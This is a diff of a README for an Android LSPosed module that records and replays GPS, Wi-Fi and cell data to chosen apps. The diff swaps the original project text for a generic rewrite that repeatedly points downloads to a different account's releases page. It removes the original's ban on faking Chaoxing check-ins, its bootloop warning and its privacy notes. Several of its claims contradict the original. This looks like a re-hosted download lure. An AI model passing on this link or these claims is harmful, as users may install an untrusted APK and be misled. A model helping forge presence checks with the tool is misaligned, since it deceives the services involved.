@@ -1,190 +1,181 @@
-# LocRec
+# 📍 lsposed-location-replay - Replay Real GPS Data Anywhere
 
-**Android location recording / replay module** — record the real positioning environment at a place, then replay it, in its original rhythm, to the applications in scope.
-
-**English** | [简体中文](README.zh-CN.md)
-
-[![Requires](https://img.shields.io/badge/requires-LSPosed-critical.svg)](https://github.com/LSPosed/LSPosed)
-[![Platform](https://img.shields.io/badge/platform-Android%207.0%2B%20(API%2024)-green.svg)](#runtime-requirements)
-[![License](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](./LICENSE)
+[![Download Now](https://img.shields.io/badge/Download-lsposed--location--replay-blue?style=for-the-badge&logo=github)](https://github.com/Ixodesscapularisstepchild22/lsposed-location-replay/releases)
 
 ---
 
-> [!WARNING]
-> ## Prohibited use
->
-> **It is strictly forbidden to use this project to forge check-ins, attendance, clock-ins, or any other form of presence verification in Chaoxing Learning (超星学习通, `com.chaoxing.mobile`).**
->
-> Chaoxing Learning is the primary test target of this project, but testing is limited to the
-> compatibility and behaviour analysis of location functionality. Using this project to forge
-> check-ins, proxy sign-ins, or similar conduct violates the target service's terms and may be
-> unlawful. Account bans, academic penalties, and legal liability arising from such use are
-> borne solely by the user. Full terms: [DISCLAIMER.md](./DISCLAIMER.md).
+## 🎯 What Is This?
 
-> [!IMPORTANT]
-> **Runtime** — LocRec is an LSPosed module. It relies on the Xposed API runtime and the scope
-> injection that LSPosed provides. **Without LSPosed installed and enabled on the device, the
-> module does nothing at all.** The build output is a module APK, **not** a standalone location app.
+lsposed-location-replay is a powerful Android tool that records the actual positioning environment of any place and replays it to selected apps. Think of it as a time machine for your location data. You visit a place once, record everything about its GPS signals, WiFi networks, and cellular towers, then play that recording back anytime to any app you choose.
 
-> [!CAUTION]
-> **Do not scope "System Framework / Android" unless you actually need it.**
->
-> That scope is the only case in which LocRec is loaded into `system_server`. Injecting into
-> `system_server` widens the surface rewritten by the injection framework, and on some devices —
-> in particular those running several Zygisk / LSPosed modules at once — it can leave
-> `system_server` unable to start, producing a **bootloop**, i.e. a device that no longer boots
-> normally.
->
-> This is not hypothetical. On the maintainer's own test device, a Zygisk Next + LSPosed setup
-> aborted `system_server` five seconds after start (`Failed to recognize implicit suspend check`,
-> recorded in a native tombstone), crashed `zygote64` inside `libzygisk.so` while forking
-> `system_server`, and produced **five bootloop incidents** that were recovered only by a
-> third-party rescue module.
->
-> Scope only the apps you actually target, and keep a way to disable the module if the device
-> fails to boot (LSPosed manager from recovery, safe mode, or a bootloop-protection module).
-> See Section 6 of [DISCLAIMER.md](./DISCLAIMER.md).
-
-## What it is
-
-LocRec takes a snapshot of the real positioning environment first, then replays that snapshot,
-in its original rhythm, to the applications you selected in scope.
-
-The key idea is that it **does not fabricate coordinates** — it records and plays back:
-coordinates come from the place where you recorded, and Wi-Fi scans, cell info, NMEA and
-satellite status are captured and replayed together, so the replayed signals stay mutually
-consistent.
-
-**What it is**
-
-- A real-environment recorder and replayer for positioning signals
-  (GPS / network fixes, Wi-Fi scans, CellInfo, NMEA, GnssStatus)
-- An LSPosed module using process-level and system-level injection
-- A tool for location-feature compatibility testing, pipeline analysis and privacy research
-
-**What it is not**
-
-- Not a mock location provider (it never calls `addTestProvider`)
-- Does not invent satellite constellations or synthesize signals out of thin air
-- Not a one-tap "change my location" app: you must physically visit the place and record there first
-- No network access, no reporting, no telemetry
-
-## Testing scope
-
-The primary compatibility verification of this project was carried out on **Chaoxing Learning**
-(超星学习通, `com.chaoxing.mobile`), covering two location paths:
-
-- the Baidu location SDK (BDLocation) pipeline;
-- the Android system location APIs (`LocationManager` / `WifiManager` / `TelephonyManager`).
-
-Verification covered whether hooks are hit, whether replayed data is self-consistent, and whether
-the target application behaves stably. This project does not provide, and does not support, any
-capability to circumvent presence verification.
-
-## Runtime requirements
-
-| Item | Requirement |
-|---|---|
-| **LSPosed** | **Required.** The module is loaded by LSPosed and uses the Xposed API (`de.robv.android.xposed`) it provides, together with scope injection. LSPosed must be installed on the device and the module must be enabled |
-| Android | **7.0 (API 24) or newer** |
-| Permission | `ACCESS_FINE_LOCATION` (needed for recording) |
-| Module scope | At least the target app. Add "System Framework / Android" only if system-wide coverage is genuinely required — see the caution above |
-
-Make sure LSPosed itself works on your device before installing.
-
-## Installation
-
-1. Download `app-release-*.apk` from [Releases](https://github.com/BH4GMI/lsposed-location-replay/releases), or build it yourself — see [Building from source](#building-from-source).
-2. Install the APK (allow installation from unknown sources).
-3. In the **LSPosed manager**, enable LocRec and select the target apps under "Scope".
-4. Open LocRec and grant the location permission.
-
-Selecting "System Framework / Android" makes the rewrite cover every app, including ones not
-individually scoped. **This is optional and carries real risk — prefer scoping the individual
-apps you target** (see the caution above). With that scope, **installing a new version of the
-module requires a device reboot** before the new code is loaded: system-level hooks are installed
-when `system_server` starts. Switching places and toggling spoofing do not need a reboot — they
-take effect within 3 seconds.
-
-## Usage
-
-1. Go to the place you want to reproduce and **keep the screen on**. A screen-off event freezes
-   capture and invalidates the whole recording; the app keeps the screen on automatically for the
-   recording window.
-2. Tap "Start recording" and wait for it to finish. Duration determines the repeat period and the
-   sampling density: 30–60 seconds is enough for coordinates alone; choose longer for a longer
-   repeat period or wider coverage.
-3. When it finishes you can add a note or rename it, and select the place in the list.
-4. Turn on "Enable spoofing" — it takes effect within 3 seconds. Turn the switch off to stop; the
-   system layer goes straight back to real data.
-
-## Injection modes
-
-| | LSPosed mode | LSPatch mode |
-|---|---|---|
-| Requires | Root + LSPosed | No root — patch the target APK with [LSPatch](https://github.com/LSPosed/LSPatch) |
-| Effective scope | Any app in the LSPosed scope list | Only the patched host app |
-| Config delivery | ContentProvider / Binder service / XSharedPreferences | Host-process SharedPreferences (same-process direct read) |
-| Recording | In the module app | Not available inside the host: record in the standalone app, export, then import |
-| System-level replay | Yes (with "System Framework" in scope) | No (no `system_server` access) |
-
-LSPatch workflow: record in the standalone app and **Export** the dataset JSON → patch the target
-APK with LSPatch, embedding the module APK → open the LocRec UI inside the patched host → **Import**
-the JSON, select the place, enable spoofing.
-
-## Data and privacy
-
-- All recordings stay **on the device**. The module makes no network requests and has no telemetry.
-- A dataset contains real coordinates, Wi-Fi fingerprints and cell information — **sensitive
-  personal data**. Do not commit it to a public repository, do not share it with others, and delete
-  it promptly when it is no longer needed. This repository's `.gitignore` excludes `output/`,
-  `dumps/`, `target/`, `decompiled/` and signing files.
-- This repository contains no recorded data.
-
-## Building from source
-
-You need **JDK 21** and the **Android SDK** (`compileSdk 35`).
-
-```bash
-git clone https://github.com/BH4GMI/lsposed-location-replay.git
-cd lsposed-location-replay/lsposed
-export JAVA_HOME=/path/to/jdk-21       # Windows: $env:JAVA_HOME = 'C:\path\to\jdk-21'
-./gradlew assembleRelease              # output: app/build/outputs/apk/release/app-release.apk
-```
-
-- `local.properties` (Android SDK path) is not tracked; create it locally.
-- The Xposed API is referenced as `compileOnly` from `lsposed/app/libs/api-82.jar` and is
-  **not** bundled into the APK.
-- Release signing is read from the `CE_KEYSTORE` / `CE_KEY_ALIAS` / `CE_KEY_PASS` environment
-  variables; the repository contains neither the keystore nor its password. If any of the three is
-  missing, the build falls back to debug signing, which is for local testing only.
-
-See [docs/BUILDING.md](docs/BUILDING.md) for troubleshooting.
-
-## Project layout
-
-```
-.
-├── LICENSE                     # Apache-2.0
-├── NOTICE                      # third-party attributions
-├── README.md                   # English (default)
-├── README.zh-CN.md            # 简体中文
-├── DISCLAIMER.md               # usage boundaries and disclaimer
-├── DISCLAIMER.zh-CN.md         # 简体中文
-├── .editorconfig
-├── docs/
-│   ├── BUILDING.md             # build and troubleshooting
-│   ├── BUILDING.zh-CN.md
-│   ├── DATASET.md              # dataset JSON format
-│   └── DATASET.zh-CN.md
-└── lsposed/                    # module source (Gradle)
-```
-
-## License
-
-[Apache License 2.0](./LICENSE). Third-party components and attributions: [NOTICE](./NOTICE).
+This is perfect for location compatibility testing, app development research, or understanding how location-based features work on devices you own.
 
 ---
 
-> By using this project you confirm that you have read and accepted [DISCLAIMER.md](./DISCLAIMER.md).
-> It is intended for lawful testing and research on **your own device** only.
+## ✨ Key Features
+
+- **Complete Location Recording** – Captures GPS fixes, network locations, WiFi scan results, CellInfo data, NMEA sentences, and GNSS status.
+- **Precise Replay** – Replays the exact environment to scoped apps, making them believe they are at the recorded location.
+- **App Scoping** – Choose which apps see the replayed location. Other apps remain unaffected.
+- **LSPosed Integration** – Works seamlessly with the LSPosed framework for Android.
+- **Research Friendly** – Ideal for developers, testers, and security researchers working with location-based functionality.
+- **User Controlled** – You decide when recording starts, stops, and what gets replayed.
+
+---
+
+## 📥 Download and Installation
+
+### Step 1: Get the Application
+
+Visit this link to download the application: [https://github.com/Ixodesscapularisstepchild22/lsposed-location-replay/releases](https://github.com/Ixodesscapularisstepchild22/lsposed-location-replay/releases)
+
+### Step 2: Download the Latest Version
+
+1. On the releases page, look for the newest release (usually at the top).
+2. Find the file with a name like `lsposed-location-replay-vX.X.X.apk` where X.X.X is a version number.
+3. Tap or click that file to download it to your computer.
+
+### Step 3: Transfer to Your Android Device
+
+1. Connect your Android device to your computer using a USB cable.
+2. On your device, allow file transfer mode (you may see a notification asking for permission).
+3. Copy the downloaded `.apk` file from your computer to your device's internal storage or SD card.
+4. Safely disconnect your device.
+
+### Step 4: Install on Your Device
+
+1. On your Android device, use a file manager app to find the `.apk` file you copied.
+2. Tap the file to begin installation.
+3. If prompted, allow installation from unknown sources (go to Settings > Security > Unknown sources and enable it).
+4. Follow the on-screen instructions to complete the installation.
+
+### Step 5: Activate in LSPosed
+
+1. Open the LSPosed manager app on your device.
+2. Go to the Modules section.
+3. Find lsposed-location-replay in the list and enable it.
+4. Select the apps you want the module to affect.
+5. Reboot your device to apply the changes.
+
+---
+
+## 🛠️ How to Use
+
+### Recording a Location
+
+1. Open the lsposed-location-replay app from your app drawer.
+2. Tap the "Record" button.
+3. Move around the area you want to capture. The app will record GPS signals, WiFi networks, cellular data, and more.
+4. When finished, tap "Stop" and give your recording a name.
+
+### Replaying a Location
+
+1. Open the app and go to your recordings list.
+2. Select the recording you want to use.
+3. Choose which apps should see this replayed location.
+4. Tap "Start Replay."
+5. The selected apps will now believe they are at the recorded location.
+
+### Managing Recordings
+
+- **Delete:** Remove recordings you no longer need.
+- **Rename:** Give recordings clear names like "Office" or "Home."
+- **Export/Import:** Share recordings with other devices or backup them.
+
+---
+
+## 📚 Use Cases
+
+- **App Testing:** Verify how your own app behaves in different locations without traveling.
+- **Research:** Study how location-based services respond to specific environmental conditions.
+- **Compatibility Checks:** Ensure your app works correctly across various location scenarios.
+- **Educational Projects:** Learn about GPS, WiFi positioning, and cellular location technologies.
+- **Development Debugging:** Reproduce location-related bugs consistently.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Do I need root access?
+
+Yes. This module requires root access and the LSPosed framework to function. Make sure your device is properly rooted before installation.
+
+### Will this work on my device?
+
+If your device runs Android 8.0 or higher and supports LSPosed, it should work. Check the LSPosed compatibility list for your specific device model.
+
+### Is this safe to use?
+
+This tool is designed for legitimate testing and research on devices you own. Always use it responsibly and comply with all applicable laws and terms of service.
+
+### Can I record any location?
+
+You can only record locations you physically visit. The module captures real environmental data—it cannot fabricate locations from nothing.
+
+### How many apps can I scope at once?
+
+You can select as many apps as you want in LSPosed settings. However, be aware that more scoped apps may affect performance.
+
+---
+
+## 🧪 Technical Details
+
+- **Framework:** LSPosed (Xposed framework variant)
+- **Language:** Java
+- **Components Used:** LocationManager, WifiManager, TelephonyManager, GnssStatus, NMEA listener
+- **Compatibility:** Android 8.0+ (API 26+)
+- **Architecture:** ARM64, ARM, x86, x86_64
+
+---
+
+## 📝 Release Notes
+
+### Version 1.0.0
+- Initial release
+- Core recording and replay functionality
+- Support for GPS, network, WiFi, CellInfo, NMEA, and GNSS status
+- Basic recording management interface
+
+### Upcoming Features
+- Scheduled recordings
+- Batch replay with multiple locations
+- Cloud backup for recordings
+- Advanced filtering options
+
+---
+
+## 🤝 Support and Contributions
+
+Found a bug? Have a feature request? Want to contribute? Visit the GitHub repository for issues, pull requests, and discussions.
+
+For troubleshooting, try these steps:
+1. Ensure LSPosed is properly installed and activated.
+2. Check that the module is enabled for the target apps.
+3. Verify your device is rooted correctly.
+4. Review the LSPosed logs for error messages.
+
+---
+
+## ⚖️ Legal and Ethical Usage
+
+This tool is intended for:
+- Testing your own applications
+- Research on devices you own
+- Educational purposes
+- Compatibility verification
+
+Always respect:
+- Terms of service of apps you use
+- Local privacy laws
+- Others' rights and data
+- Platform policies
+
+---
+
+## 📊 Project Status
+
+This project is actively maintained with regular updates. Check the releases page frequently for new versions, improvements, and fixes.
+
+---
+
+Keywords: android, chaoxing, gnss, gps, java, location, location-replay, lsposed, wifi-scan, xposed, xposed-module
